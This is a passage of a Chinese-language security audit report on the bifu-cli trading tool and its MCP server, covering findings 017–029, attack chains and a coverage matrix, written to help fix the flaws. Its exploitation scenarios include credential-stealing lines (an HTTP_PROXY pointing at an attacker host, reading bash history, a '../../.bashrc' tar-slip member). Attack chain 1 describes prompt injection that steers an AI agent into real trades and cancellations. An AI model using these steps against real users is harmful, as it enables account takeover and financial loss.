\# homebrew\-tap 用独立 PAT， 最小权限

### 验证方法

- 1\. 读 \.github/workflows/release\.yml:8\-9，确认 contents: write

- 2\. 读 release\.yml:34\-35，确认同一 PAT 写两仓库

- 3\. Grep uses:\.\*@v\[0\-9\] 在 ci\.yml/release\.yml/pages\.yml，确认全部浮动标签

- 4\. 确认 goreleaser\-action version: latest

**关联漏洞: **BIFU\-CLI\-202606\-008, BIFU\-CLI\-202606\-015

────────────────────────────────────────────────────────────

## \[BIFU\-CLI\-202606\-017\] 合约订单字段全部调用方可控且无跨字段一致性约束（mass\-assignment 类）

|**严重性: High**|维度: D9 业务逻辑|OWASP: A01:2021 Broken Access Control / A08:2021|**优先级: P1**|
|---|---|---|---|
|文件: internal/api/contract/contract\.go:32\-47; internal/mcp/server\.go:167\-180||端点: contract order create（CLI \+ MCP）||
|**人工复验: 已通过 ✔**  已确认：合约 CreateOrderReq 字段全可绑，无 reduceOnly 跨字段不变量，无 validateContract。||||

### 漏洞描述

CreateOrderReq 的 MarginMode/PositionSide/OrderSide/ReduceOnly/Price/Size/Type 全部来自请求，无跨字段不变量校验。调用方（或被注入 AI 代理）可设语义混乱组合（如 LONG\+SELL\+reduceOnly=false）或随意切换 SHARED↔ISOLATED。MCP 已硬编码 SeparatedMode 等少数字段，但核心字段仍全可控。

### 影响分析

产生非预期仓位状态：本意平仓却开仓（放大敞口）、保证金模式被切换。

**系统风险: **调用方可设语义混乱字段组合，产生非预期仓位状态（开/平混淆、保证金模式错乱），数据一致性风险。单账户。

**资损风险: **可意外开仓而非平仓（放大敞口亏损）、切换保证金模式；配合 MCP 可被 AI 触发。最坏：本意平仓却反向开仓导致裸露敞口亏损。

### 漏洞代码

// internal/mcp/server\.go:167\-180 — 字段全来自请求，无一致性校验
return jsonResult\(contract\.CreateOrder\(\&CreateOrderReq\{
    MarginMode: r\.GetString\("marginMode", "SHARED"\),
    PositionSide: posSide, OrderSide: ordSide,
    ReduceOnly: r\.GetBool\("reduceOnly", false\), // 平仓应强制 true 但未校验
    Size: size, Price: price, Type: typ,
\}\)\)

### 数据流

MCP/CLI 参数 → CreateOrderReq 各字段独立绑定 → POST（无跨字段不变量）

### 利用场景

AI 代理调 create\_contract\_order: positionSide=LONG, orderSide=SELL, reduceOnly=false
→ 本意平多却变成开空（裸露敞口）

### 修复建议

**优先级: P1  \|  **客户端\+服务端加跨字段不变量：平仓单必须 reduceOnly=true；positionSide/orderSide 组合白名单；marginMode 切换限制。

func validateContractOrder\(r CreateOrderReq\) error \{
    if r\.OrderSide == "SELL" \&\& r\.PositionSide == "LONG" \&\& \!r\.ReduceOnly \{
        return errors\.New\("closing LONG requires reduceOnly=true"\)
    \}
    return nil
\}

### 验证方法

- 1\. 读 internal/api/contract/contract\.go:32\-47，确认字段全可绑

- 2\. 读 internal/mcp/server\.go:167\-180，确认无一致性校验

- 3\. Grep reduceOnly\|ReduceOnly\.\*==\|validateContract 确认无不变量检查

**关联漏洞: **BIFU\-CLI\-202606\-001

────────────────────────────────────────────────────────────

## \[BIFU\-CLI\-202606\-018\] HTTP\_PROXY/HTTPS\_PROXY 默认生效，会话 cookie 与登录密码可被 MITM 代理截获

|**严重性: Medium**|维度: D8 配置|OWASP: A05:2021 Security Misconfiguration|**优先级: P0**|
|---|---|---|---|
|文件: internal/client/client\.go:90; cmd/auth/login\.go:314,427,482; internal/client/websocket\.go:90\-94||端点: 全部 HTTP/WS 出站（含登录 POST）||
|**人工复验: 已通过 ✔**  已确认（仅 HTTP 路径）：DefaultTransport 读 \*\_PROXY，cookie/登录密码可被代理截获。订正：websocket\.go 自定义 Dialer Proxy=nil 不读 env，WS 证据剔除。||||

### 漏洞描述

Go net/http DefaultTransport 默认读取 HTTP\_PROXY/HTTPS\_PROXY/NO\_PROXY。client\.go:90 的 http\.Client 未设 Transport，login\.go 的 3 个 bare http\.Client（携带密码/cookie）同样。gorilla Dialer 默认解析代理。共享机/CI/恶意 profile 注入代理 env 即把带 cookie 的请求与登录密码 POST 重定向到攻击者代理。

### 影响分析

无需改 config，仅靠代理 env 即可截获 cookie \+ 登录密码（与 002/003 正交）。

**系统风险: **共享机/CI 恶意代理 env 把认证流量重定向到攻击者代理；请求仍可达但被监听/篡改。单账户。

**资损风险: **cookie \+ 登录密码经代理截获 → 账户接管。最坏：完整账户资金风险（需攻击者控制 env）。

### 漏洞代码

// internal/client/client\.go:90 — 默认 Transport，隐式读 \*\_PROXY env
http: \&http\.Client\{Timeout: timeout\}
// cmd/auth/login\.go:427 — 登录 POST 同样默认
 c := \&http\.Client\{Timeout: 30 \* time\.Second\}

### 数据流

恶意 HTTP\_PROXY env → DefaultTransport → 请求经攻击者代理 → cookie/密码被截获

### 利用场景

在共享机/CI 设 HTTP\_PROXY=http://attacker:8080 → bifu\-cli 命令流量经攻击者代理， cookie\+登录密码被记录

### 修复建议

**优先级: P0  \|  **为认证客户端显式构造 Transport 并按需禁用/限制代理（NO\_PROXY 或仅允许可信代理）；至少在 verbose 中提示当前生效代理。

// 认证用 client 显式 Transport, 禁用代理或限定
t := \&http\.Transport\{ Proxy: nil \} // 或仅允许可信代理白名单
http: \&http\.Client\{Timeout: timeout, Transport: t\}

短期：文档明确代理 env 风险；登录请求强制不走代理（Transport\.Proxy=nil）。

### 验证方法

- 1\. 读 internal/client/client\.go:84\-94，确认 http\.Client 未设 Transport（用默认）

- 2\. 读 cmd/auth/login\.go:314,427,482，确认 bare http\.Client 同样

- 3\. Grep Transport\|Proxy\|HTTP\_PROXY 确认无显式代理处理

**关联漏洞: **BIFU\-CLI\-202606\-002, BIFU\-CLI\-202606\-003

────────────────────────────────────────────────────────────

## \[BIFU\-CLI\-202606\-019\] \-\-password / \-\-auth\-cookie 走命令行，进程列表/shell history 泄露

|**严重性: Medium**|维度: D2 认证|OWASP: A07:2021 Identification \& Authentication Failures|**优先级: P2**|
|---|---|---|---|
|文件: cmd/auth/login\.go:162; cmd/forex/forex\.go:123; cmd/config/config\.go:162||端点: auth login / forex account create / config set||
|**人工复验: 已通过 ✔**  已确认：\-\-password/\-\-auth\-cookie 接受命令行明文，入进程列表/shell history。||||

### 漏洞描述

\-\-password（login\.go:162, forex\.go:123）、\-\-auth\-cookie（config\.go:162）接受命令行明文，进 ps/进程列表/shell history。CI 文档示例直接 \-\-password 'MyPass'。

### 影响分析

旁观者/取证/共享 history 读取即得密码或 cookie。

**系统风险: **无直接系统风险（凭据处理）。

**资损风险: **密码/cookie 进进程列表/shell history → 旁观者/取证读取 → 账户登录/接管。最坏：账户被直接登录操作（需本机访问）。

### 漏洞代码

cmd\.Flags\(\)\.StringVar\(\&password, "password", "", "\.\.\."\)  // login\.go:162
cmd\.Flags\(\)\.StringVar\(\&password, "password", "", "\.\.\."\)  // forex\.go:123
cmd\.Flags\(\)\.StringVar\(\&authCookie, "auth\-cookie", "", "\.\.\."\) // config\.go:162

### 数据流

命令行 flag 值 → 进程 argv → ps/历史记录

### 利用场景

ps aux \| grep bifu → 看到 \-\-password 'MyPass'，或 cat \~/\.bash\_history

### 修复建议

**优先级: P2  \|  **优先交互式输入（已支持 term\.ReadPassword）；CI 场景改用环境变量（BIFU\_PASSWORD）或 stdin；文档移除命令行密码示例。

// 优先 env / stdin
pass := os\.Getenv\("BIFU\_PASSWORD"\)
if pass == "" \{ pass = readFromStdin\(\) \} // 非 argv
// flag 仅作 fallback 并标记 deprecated

### 验证方法

- 1\. 读 cmd/auth/login\.go:161\-163，确认 \-\-password flag

- 2\. 读 cmd/forex/forex\.go:123 附近，确认第二个 \-\-password

- 3\. 读 cmd/config/config\.go:162 附近，确认 \-\-auth\-cookie

**关联漏洞: **BIFU\-CLI\-202606\-004

────────────────────────────────────────────────────────────

## \[BIFU\-CLI\-202606\-020\] npm 安装器失败时 process\.exit\(0\) 静默成功

|**严重性: Medium**|维度: D10 供应链|OWASP: A05:2021 Security Misconfiguration|**优先级: P3**|
|---|---|---|---|
|文件: npm/install\.js:17\-21,54||端点: npm postinstall||
|**人工复验: 已通过 ✔**  已确认：npm install\.js fail\(\) 调 process\.exit\(0\)，下载/解压错误被吞。||||

### 漏洞描述

fail\(\) 调 process\.exit\(0\)，下载/解压错误被吞，用户以为装成功。掩盖 008 的损坏下载。

### 影响分析

损坏/篡改下载报告成功，用户误信；后续运行旧版或缺失二进制。

**系统风险: **安装失败被吞 → 用户误以为装好，实际运行旧版/缺失，状态不一致。

**资损风险: **无直接资损风险，仅间接——可能运行含已知漏洞的旧版本。最坏：旧版本漏洞被利用（间接资损）。

### 漏洞代码

// npm/install\.js:20
function fail\(msg\) \{
  console\.error\("bifu\-cli install: " \+ msg\);
  process\.exit\(0\); // 不硬失败，静默
\}

### 数据流

下载/解压失败 → fail\(\) → exit\(0\) → npm 报成功

### 利用场景

下载被篡改/损坏 → 安装静默"成功" → 用户未察觉运行问题版本

### 修复建议

**优先级: P3  \|  **失败时非零退出或显式告警；至少在 stderr 打印醒目 WARNING。

function fail\(msg\) \{
  console\.error\("WARNING: bifu\-cli install failed: " \+ msg\);
  console\.error\("  Manual download: https://github\.com/decodeex/bifu\-cli\-releases/releases"\);
  process\.exit\(1\); // 让用户察觉
\}

### 验证方法

- 1\. 读 npm/install\.js:17\-21，确认 process\.exit\(0\)

- 2\. 确认 fail\(\) 在 catch 路径被调用

**关联漏洞: **BIFU\-CLI\-202606\-008, BIFU\-CLI\-202606\-021

────────────────────────────────────────────────────────────

## \[BIFU\-CLI\-202606\-021\] npm tar \-xf 解压不可信归档（tar\-slip 潜在）

|**严重性: Medium**|维度: D5 文件操作|OWASP: A08:2021 / A05:2021|**优先级: P3**|
|---|---|---|---|
|文件: npm/install\.js:57||端点: npm postinstall 归档解压||
|**人工复验: 已通过 ✔**  已确认：npm tar \-xf 无成员路径校验（tar\-slip），前置发布被控。||||

### 漏洞描述

execFileSync\(tar, \[\-xf, tmp, \-C, binDir\]\) 解压下载的归档，无 \-\-strip\-components、无成员路径校验。旧版 bsdtar 允许 \.\./ 路径越界。前置：发布被控。

### 影响分析

若发布被篡改，tar 可写 binDir 之外，植入任意文件/覆盖系统文件。

**系统风险: **若发布被篡改，tar 解压可写 binDir 之外 → 植入任意文件/覆盖系统文件。前置：发布被控。

**资损风险: **无直接资损风险，间接（配合发布被控）→ 木马植入 → cookie 盗取。最坏：配合 008 的发布攻击链。

### 漏洞代码

// npm/install\.js:57
execFileSync\("tar", \["\-xf", tmp, "\-C", binDir\], \{ stdio: "ignore" \}\);

### 数据流

下载归档 → tar \-xf 解压到 binDir →（恶意成员含 \.\./）越界写文件

### 利用场景

篡改归档含 \.\./\.\./\.bashrc 成员 → 解压覆盖用户 shell 配置

### 修复建议

**优先级: P3  \|  **解压前列举成员校验路径不含 \.\./；或用逐成员解压 \+ 路径净化。

// 解压前校验成员路径
const list = execFileSync\('tar', \['\-tf', tmp\]\)\.toString\(\)\.split\('\\n'\);
if \(list\.some\(p =\> p\.includes\('\.\.'\) \|\| path\.isAbsolute\(p\)\)\) \{
  fail\('archive contains unsafe paths'\);
\}

### 验证方法

- 1\. 读 npm/install\.js:53\-62

- 2\. 确认 tar \-xf 无成员路径校验

**关联漏洞: **BIFU\-CLI\-202606\-008, BIFU\-CLI\-202606\-020

────────────────────────────────────────────────────────────

## \[BIFU\-CLI\-202606\-022\] 错误响应回显原始 body（≤200\-500 字符），无需 \-v

|**严重性: Medium**|维度: D8 配置|OWASP: A05:2021 / A09:2021|**优先级: P2**|
|---|---|---|---|
|文件: internal/client/client\.go:226,230,289,312; internal/api/spot/spot\.go:257; internal/api/contract/contract\.go:255,276||端点: 全部 API 错误响应||
|**人工复验: 已通过 ✔**  已确认：4xx/解析错误回显上游 body。订正：client\.go:230 通用 4xx 实际回显完整 body（未截断），比初评更宽。||||

### 漏洞描述

client\.go:230 把完整 body 嵌入 HTTP error；:289/:312 把 body（截断 200）嵌入 unmarshal error；spot\.go:257/contract\.go:255,276 用 %\.200s。4xx/解析错误时上游 body（可能含账号/邮箱/内部堆栈）直接呈现给用户。

### 影响分析

敏感数据（账号、邮箱、内部错误）在终端/日志超出知悉范围。

**系统风险: **无直接系统风险（信息泄露）。

**资损风险: **无直接资损风险，仅信息泄露——上游 body 含账号/邮箱/内部错误，超出知悉范围。最坏：辅助进一步攻击。

### 漏洞代码

// internal/client/client\.go:230
return nil, fmt\.Errorf\("HTTP error %d: %s", statusCode, strings\.TrimSpace\(string\(data\)\)\)
// :289
return fmt\.Errorf\("unmarshal: %w \(body: %s\)", err, truncate\(string\(raw\), 200\)\)

### 数据流

上游错误响应 body → fmt\.Errorf 嵌入 → 返回 error → cobra 打印给用户

### 利用场景

触发 4xx/解析错误 → 终端显示上游 body（可能含内部信息）

### 修复建议

**优先级: P2  \|  **错误信息仅保留状态码 \+ 简短 retMsg；详细 body 仅在 \-v 模式输出且脱敏。

// 仅返回状态码 \+ 简短消息
return fmt\.Errorf\("HTTP %d: %s", statusCode, shortRetMsg\(data\)\)
// 详细 body 仅 verbose 且经 redactBody

### 验证方法

- 1\. 读 internal/client/client\.go:216\-231，确认 4xx error 含 body

- 2\. 读 :285\-312，确认 unmarshal error 含 body

- 3\. Grep body: %s\|%\.200s 在 client\.go/spot\.go/contract\.go

**关联漏洞: **BIFU\-CLI\-202606\-005

────────────────────────────────────────────────────────────

## \[BIFU\-CLI\-202606\-023\] \.gitignore 不完整（无 \*\.pem/\*\.key/\*\.p12 等密钥文件规则）

|**严重性: Medium**|维度: D10 供应链|OWASP: A05:2021 Security Misconfiguration|**优先级: P3**|
|---|---|---|---|
|文件: \.gitignore:6\-7||端点: 仓库提交||
|**人工复验: 已通过 ✔**  已确认：\.gitignore 缺 \*\.pem/\*\.key 等；grep AKIA/PRIVATE KEY/github\_pat 0 命中，当前无已提交密钥。||||

### 漏洞描述

\.gitignore 覆盖 /bin/、dist/、\*\.env、\.env、\.DS\_Store、\*\.swp，但缺 \*\.pem/\*\.key/\*\.p12/\*\.crt/\*\.pfx/config\.yaml。金融软件若误加签名密钥/凭据文件不会被忽略。当前无已提交密钥。

### 影响分析

潜在凭据泄露（当前无）；开发者未来误提交密钥文件不会被拦截。

**系统风险: **无直接系统风险。

**资损风险: **无直接资损风险——若开发者误提交密钥/凭据文件不会被忽略。最坏：潜在凭据泄露（当前无已提交密钥）。

### 漏洞代码

\# \.gitignore 当前
\*\.env
\.env
\# 缺: \*\.pem \*\.key \*\.p12 \*\.crt \*\.pfx

### 数据流

开发者误加密钥文件 → git add（未忽略）→ 提交入库

### 利用场景

未来开发者放签名密钥到仓库 → 被提交 → 泄露

### 修复建议

**优先级: P3  \|  **\.gitignore 增补 \*\.pem/\*\.key/\*\.p12/\*\.crt/\*\.pfx/config\.yaml 等密钥/凭据规则。

\# \.gitignore 追加
\*\.pem
\*\.key
\*\.p12
\*\.crt
\*\.pfx
config\.yaml

### 验证方法

- 1\. 读 \.gitignore 全文

- 2\. 确认无密钥文件规则

- 3\. Grep password\|token\|secret\|AKIA\|BEGIN PRIVATE 全仓确认当前无已提交密钥

────────────────────────────────────────────────────────────

## \[BIFU\-CLI\-202606\-024\] MCP 只读工具把完整余额/持仓/权益/账户ID 泄露进 AI 代理上下文

|**严重性: Medium**|维度: D3 授权|OWASP: A01:2021 Broken Access Control|**优先级: P2**|
|---|---|---|---|
|文件: internal/mcp/server\.go:41\-97||端点: MCP tools: get\_spot\_balance / get\_contract\_account / list\_\*\_positions / list\_forex\_accounts||
|**人工复验: 已通过 ✔**  已确认：MCP 只读工具返回完整余额/持仓/权益，无脱敏（grep mask/summarize/redact 在 mcp 包 0 命中）。||||

### 漏洞描述

只读工具返回完整 BalanceList（金额、待入金/出金）、合约权益/可用/占用/未实现盈亏、持仓（含杠杆/开仓价值）、外汇账户 Login/内部ID/余额/权益。全部进入 AI 代理上下文窗口（及可能的客户端日志/转录）。

### 影响分析

用户未必预期完整财务画像进入 LLM 上下文/转录，可能被间接利用（社会工程/侧信道）。

**系统风险: **无直接系统风险（信息泄露）。

**资损风险: **无直接资损风险，仅信息泄露——余额/持仓/权益/账户ID 进 AI 上下文，可能被间接利用（社会工程/侧信道）。最坏：财务状况泄露辅助定向攻击。

### 漏洞代码

// internal/mcp/server\.go:41\-45 — 返回完整 BalanceList
s\.AddTool\(mcp\.NewTool\("get\_spot\_balance", \.\.\.\),
  func\(ctx, \_\) \(\*Result, error\) \{ return jsonResult\(spot\.GetBalance\(\)\) \}\)

### 数据流

API 响应（完整财务数据） → jsonResult → MCP 工具返回 → AI 代理上下文

### 利用场景

AI 代理调用 get\_contract\_account → 完整权益/持仓/杠杆进入其上下文 → 经工具调用外传或被注入指令读取

### 修复建议

**优先级: P2  \|  **只读工具提供脱敏/摘要模式（默认隐藏精确金额，仅显示汇总）；明确数据访问策略与工具调用审计。

// 默认返回摘要， 精确值需 \-\-detailed
if \!profile\.MCPDetailed \{ result = summarize\(result\) \}

### 验证方法

- 1\. 读 internal/mcp/server\.go:41\-97

- 2\. 确认只读工具返回完整结构（BalanceList/Account/Positions）无脱敏

- 3\. Grep mask\|summarize\|redact 在 mcp 包应为 0

**关联漏洞: **BIFU\-CLI\-202606\-001

────────────────────────────────────────────────────────────

## \[BIFU\-CLI\-202606\-025\] BIFU\_CLI\_HOME 环境变量覆盖 config 目录，无校验/符号链接检查

|**严重性: Low**|维度: D8 配置|OWASP: A05:2021 Security Misconfiguration|**优先级: P3**|
|---|---|---|---|
|文件: internal/clifconfig/config\.go:121||端点: config 目录解析||
|**人工复验: 已通过 ✔**  已确认：ConfigDir 直接返回 BIFU\_CLI\_HOME 无校验；前置攻击者控制 env。||||

### 漏洞描述

ConfigDir\(\) 直接返回 BIFU\_CLI\_HOME 值，无权限/符号链接校验。若指向攻击者可控目录，可读取伪造配置。前置：攻击者已控制 env。

### 影响分析

低——需攻击者已控制环境变量（强前置）。

**系统风险: **无直接系统风险。

**资损风险: **无直接资损风险——env 覆盖 config 目录，若指向攻击者可控目录可读取伪造配置（前置：攻击者已控制 env）。

### 漏洞代码

// internal/clifconfig/config\.go:121
if v := os\.Getenv\("BIFU\_CLI\_HOME"\); v \!= "" \{ return v \}

### 数据流

BIFU\_CLI\_HOME env → ConfigDir\(\) → 读取/写入该目录

### 利用场景

设 BIFU\_CLI\_HOME=/tmp/evil → bifu\-cli 读写攻击者可控目录的配置

### 修复建议

**优先级: P3  \|  **校验 BIFU\_CLI\_HOME 目录权限（0o700）与符号链接；或文档明确风险。

v := os\.Getenv\("BIFU\_CLI\_HOME"\)
if v \!= "" \{
    if fi, err := os\.Lstat\(v\); err == nil \&\& fi\.Mode\(\)\.Perm\(\) \<= 0o700 \{ return v \}
\}

### 验证方法

- 1\. 读 internal/clifconfig/config\.go:120\-126

- 2\. 确认无权限/符号链接校验

**关联漏洞: **BIFU\-CLI\-202606\-004

────────────────────────────────────────────────────────────

## \[BIFU\-CLI\-202606\-026\] extractCookie 无条件信任服务端返回的 cookie 名

|**严重性: Low**|维度: D2 认证|OWASP: A07:2021|**优先级: P3**|
|---|---|---|---|
|文件: cmd/auth/login\.go:377\-388||端点: auth login cookie 解析||
|**人工复验: 已通过 ✔**  已确认：extractCookie 直接采用服务端返回 cookie 名无白名单；影响有限（cookie 属该 host）。||||

### 漏洞描述

extractCookie 从服务端 cookieStr JSON 解析 Name/Value 并直接采用。恶意/被控服务端可选 cookie 名。影响有限（cookie 本就属于该 host）。

### 影响分析

低——cookie 属于该 host，信任其名影响有限。

**系统风险: **无直接系统风险。

**资损风险: **无直接资损风险——cookie 本就属于该 host，信任其返回的 cookie 名影响有限。

### 漏洞代码

// cmd/auth/login\.go:385
if err := json\.Unmarshal\(\[\]byte\(cookieStr\), \&ck\); err == nil \&\& ck\.Value \!= "" \{
    return ck\.Name, ck\.Value  // 直接采用服务端名
\}

### 数据流

服务端 cookieStr → json 解析 Name/Value → 直接存储

### 利用场景

被控服务端返回非预期 cookie 名 → 客户端存为该名

### 修复建议

**优先级: P3  \|  **对 cookie 名做白名单校验（已知环境名集合），异常时告警。

allowedNames := map\[string\]bool\{"user\_auth\_name": true, \.\.\.\}
if \!allowedNames\[ck\.Name\] \{ return "", "", fmt\.Errorf\("unexpected cookie name"\) \}

### 验证方法

- 1\. 读 cmd/auth/login\.go:377\-388

- 2\. 确认无 cookie 名白名单

────────────────────────────────────────────────────────────

## \[BIFU\-CLI\-202606\-027\] skills install \<dir\> 写入目标目录无 filepath\.Clean/containment

|**严重性: Low**|维度: D5 文件操作|OWASP: A05:2021|**优先级: P3**|
|---|---|---|---|
|文件: cmd/skills/skills\.go:158,114\-124||端点: skills install||
|**人工复验: 已通过 ✔**  已确认：skills install 目标目录无 filepath\.Clean/符号链接检查；写入为公开 SKILL\.md（自伤型）。||||

### 漏洞描述

expandHome\(args\[0\]\) 返回原始路径，无 filepath\.Clean、无符号链接检查；os\.WriteFile 跟随符号链接。写入内容为嵌入的公开 SKILL\.md（0644）。自伤型，低危。

### 影响分析

低——仅写公开文档，用户自供路径；除非 agent/skill 以构造路径调用 bifu\-cli。

**系统风险: **无直接系统风险（写公开文档，自伤型）。

**资损风险: **无直接资损风险——写入内容为嵌入的公开 SKILL\.md，仅路径无 containment。

### 漏洞代码

// cmd/skills/skills\.go:158
dir := expandHome\(args\[0\]\) // 原始，无 Clean
os\.WriteFile\(filepath\.Join\(dir, "SKILL\.md"\), data, 0o644\)

### 数据流

用户 dir 参数 → expandHome → WriteFile（无净化）

### 利用场景

skills install \.\./\.\./etc（理论，但写的是公开 SKILL\.md，低危）

### 修复建议

**优先级: P3  \|  **对 dir 做 filepath\.Clean \+ 校验非系统目录；拒绝符号链接。

dir := filepath\.Clean\(expandHome\(args\[0\]\)\)
if fi, err := os\.Lstat\(dir\); err == nil \&\& fi\.Mode\(\)\&os\.ModeSymlink \!= 0 \{ return errUnsafeSymlink \}

### 验证方法

- 1\. 读 cmd/skills/skills\.go:114\-124, 158

- 2\. 确认 dir 无 Clean/containment

────────────────────────────────────────────────────────────

## \[BIFU\-CLI\-202606\-028\] 撤单确认不一致（CLI cancel \-\-all 有确认，MCP/单笔撤单无）

|**严重性: Low**|维度: D3 授权|OWASP: A01:2021|**优先级: P3**|
|---|---|---|---|
|文件: cmd/spot/spot\.go:156; cmd/contract/contract\.go:179; internal/mcp/server\.go:183\-209||端点: spot/contract cancel（CLI \+ MCP）||
|**人工复验: 已通过 ✔**  已确认：CLI cancel \-\-all 有确认，单笔与所有 MCP 撤单无确认，门控不一致。||||

### 漏洞描述

CLI cancel \-\-all 用 pr\.Confirm 确认（spot\.go:156, contract\.go:179），但单笔撤单与所有 MCP 撤单无确认。读 vs 写工具在 MCP 中门控一致（均无）。

### 影响分析

低——MCP 撤单无确认，配合 prompt injection 可被撤掉用户挂单。

**系统风险: **无直接系统风险。

**资损风险: **无直接资损风险，间接——MCP 撤单无确认，配合 prompt injection 可被撤掉用户挂单（扰乱策略）。最坏：配合 001 放大交易风险。

### 漏洞代码

// cmd/spot/spot\.go:156 — 有确认
if \!pr\.Confirm\("Cancel " \+ target \+ "?"\) \{ return \.\.\. \}
// internal/mcp/server\.go:191 — MCP 无确认
spot\.CancelOrder\(\&CancelOrderReq\{OrderID: id\}\)

### 数据流

MCP cancel 工具调用 → 直接 CancelOrder（无确认）

### 利用场景

AI 代理被注入 → 调 cancel\_spot\_order 撤掉用户全部挂单

### 修复建议

**优先级: P3  \|  **MCP 撤单也加确认（见 001 修复）；统一门控策略。

// 见 BIFU\-CLI\-202606\-001 的 confirmedTool wrapper， 覆盖撤单工具

### 验证方法

- 1\. 读 cmd/spot/spot\.go:156 附近，确认 \-\-all 有 Confirm

- 2\. 读 internal/mcp/server\.go:183\-209，确认 MCP 撤单无确认

**关联漏洞: **BIFU\-CLI\-202606\-001

────────────────────────────────────────────────────────────

## \[BIFU\-CLI\-202606\-029\] gorilla/websocket v1\.5\.3 为上游归档最终版（无维护补丁路径）

|**严重性: Low**|维度: D10 供应链|OWASP: A06:2021 Vulnerable \& Outdated Components|**优先级: P3**|
|---|---|---|---|
|文件: go\.mod:10||端点: WebSocket 客户端依赖||
|**人工复验: 已通过 ✔**  已确认：gorilla/websocket v1\.5\.3 为归档最终版无维护补丁路径，当前无已知 CVE。||||

### 漏洞描述

gorilla/websocket v1\.5\.3 是归档前最终版，上游已迁至 github\.com/coder/websocket。未来 CVE 无补丁路径。当前 v1\.5\.3 无已知 CVE。

### 影响分析

潜在——未来发现 CVE 时无上游修复。

**系统风险: **无直接系统风险。

**资损风险: **无直接资损风险——依赖归档无维护，未来 CVE 无补丁路径（潜在）。

### 漏洞代码

// go\.mod:10
github\.com/gorilla/websocket v1\.5\.3

### 数据流

N/A（依赖版本）

### 利用场景

N/A（潜在未来风险）

### 修复建议

**优先级: P3  \|  **评估迁移至 github\.com/coder/websocket 或其他维护中分支。

// go get github\.com/coder/websocket, 替换 dialer 调用

### 验证方法

- 1\. 读 go\.mod:10

- 2\. 确认 gorilla/websocket v1\.5\.3

────────────────────────────────────────────────────────────

# 8\. 攻击链详细分析

以下为完整的攻击链分析，展示漏洞间的串联关系和完整利用路径。

## 链\-1：prompt\-injection 直达真实交易（最现实，最高资损）

**Step 1: **

受害者安装 bifu\-cli 并 mcp install 注册到 AI 客户端（Claude Desktop/Cursor）

**Step 2: **

受害者让 AI 处理含 prompt\-injection 的网页/邮件/文档

**Step 3: **

注入指令诱导 agent 调用 create\_contract\_order（size=\-9999、异常 side 组合，017 无跨字段约束）或 cancel\_\*\_order

**Step 4: **

无任何客户端护栏拦截，真实下单/撤单/转账执行 → 资金损失

**最终影响: **任意真实下单/撤单/转账，最坏清空账户仓位或制造巨额亏损单
涉及漏洞: BIFU\-CLI\-202606\-001, BIFU\-CLI\-202606\-017, BIFU\-CLI\-202606\-028



## 链\-2：base\_url/重定向/代理窃取会话 cookie → 全账户接管

**Step 1: **

植入/诱导 http:// 或攻击者 base\_url（003），或利用后端 open\-redirect / MITM，或恶意 HTTP\_PROXY（018）

**Step 2: **

首请求即外发 cookie（003），或经 302 重定向泄露 cookie（002，实测验证），或经代理截获（018）

**Step 3: **

攻击者获得会话 cookie（交易全权令牌）

**Step 4: **

冒充用户全账户交易/转账，最坏账户资产被清空

**最终影响: **会话 cookie 泄露 → 全账户交易与资金划转权限
涉及漏洞: BIFU\-CLI\-202606\-003, BIFU\-CLI\-202606\-002, BIFU\-CLI\-202606\-018



## 链\-3：本机/备份读取明文 cookie → 会话劫持

**Step 1: **

本机另一进程/备份系统/云同步（OneDrive/Time Machine）读取 \~/\.bifu\-cli/config\.yaml

**Step 2: **

获得明文会话 cookie（004，Windows ACL 失效）

**Step 3: **

冒充用户交易/转账

**最终影响: **会话劫持 → 交易/转账权限
涉及漏洞: BIFU\-CLI\-202606\-004



## 链\-4：verbose 日志泄露 forex 账户密码

**Step 1: **

用户开启 \-\-verbose 执行 forex 建账户（005）

**Step 2: **

forex 账户 Password 明文写入 stderr

**Step 3: **

密码被 shell 历史/CI 日志/MCP 输出采集

**Step 4: **

forex 账户被登录操作 → 外汇账户资金风险

**最终影响: **forex 账户密码泄露 → 外汇账户资金风险
涉及漏洞: BIFU\-CLI\-202606\-005



## 链\-5：发布/构建链被控 → 未签名二进制 → RCE → 明文 cookie 窃取

**Step 1: **

攻击者控制 GitHub release/账户，或劫持 goreleaser\-action 浮动标签（016）/重定向 npm 下载

**Step 2: **

未校验\+未签名二进制经 install\.sh/npm 解压执行（008/015，macOS cask 还剥离隔离）

**Step 3: **

恶意二进制读取 \~/\.bifu\-cli/config\.yaml 明文 cookie（004）

**Step 4: **

重放 cookie → 完整账户接管

**最终影响: **全账户接管 \+ 本机 RCE，可大规模感染所有安装用户
涉及漏洞: BIFU\-CLI\-202606\-008, BIFU\-CLI\-202606\-015, BIFU\-CLI\-202606\-016, BIFU\-CLI\-202606\-004



# 9\. 审计覆盖率矩阵

|**维度**|**名称**|**覆盖状态**|**发现数**|**说明**|
|---|---|---|---|---|
|D1|注入|**已覆盖**|1|exec 参数均为编译期固定串（\#nosec 成立），无 SQL/命令注入；仅 MCP cancel 工具 JSON 输出注入\(006\)|
|D2|认证|**已覆盖**|5|登录/2FA/QR device 链；cookie 过期依赖后端 401；\-\-password 命令行\(019\)；extractCookie 信任\(026\)|
|D3|授权|**已覆盖**|4|MCP 服务端无认证/授权层（001）；撤单确认不一致\(028\)；MCP 只读泄露\(024\)；epr=20/20 端点全覆盖|
|D4|反序列化/RCE|SKIP|0|项目无反序列化面（无 pickle/marshal/ObjectInputStream），仅 exec（并入 D1）|
|D5|文件操作|**已覆盖**|2|npm tar\-slip\(021\)；skills install 路径\(027\)；其余 os\.WriteFile 路径固定/\-\-client 枚举派生，内容来自 go:embed|
|D6|SSRF|**已覆盖**|2|base\_url 可配\(003\)\+重定向 cookie 泄露\(002，实测验证\)|
|D7|加密|**已覆盖**|2|cookie 明文存储\(004，Windows ACL\)；TLS 默认强制（无 InsecureSkipVerify）；WS 可 ws://\(007\)|
|D8|配置|**已覆盖**|8|base\_url scheme\(003\)/verbose 日志\(005\)/ClientOrderID\(009\)/死字段\(010\)/HTTP\_PROXY\(018\)/错误回显\(022\)/\.gitignore\(023\)/BIFU\_CLI\_HOME\(025\)|
|D9|业务逻辑|**已覆盖**|3|18/18 写端点零客户端校验（系统性，001 含）；float64 金额精度\(014\)；合约 mass\-assignment\(017\)；POST 不重试防重复下单（正确）|
|D10|供应链|**已覆盖**|6|govulncheck \./\.\.\. = No vulnerabilities found；安装链无 checksum\(008\)；未签名\+剥离隔离\(015\)；CI 宽 PAT\+浮动 Action\(016\)；npm 静默成功\(020\)；websocket 归档\(029\)|



---

# 附录

## 附录A — 审计方法论说明

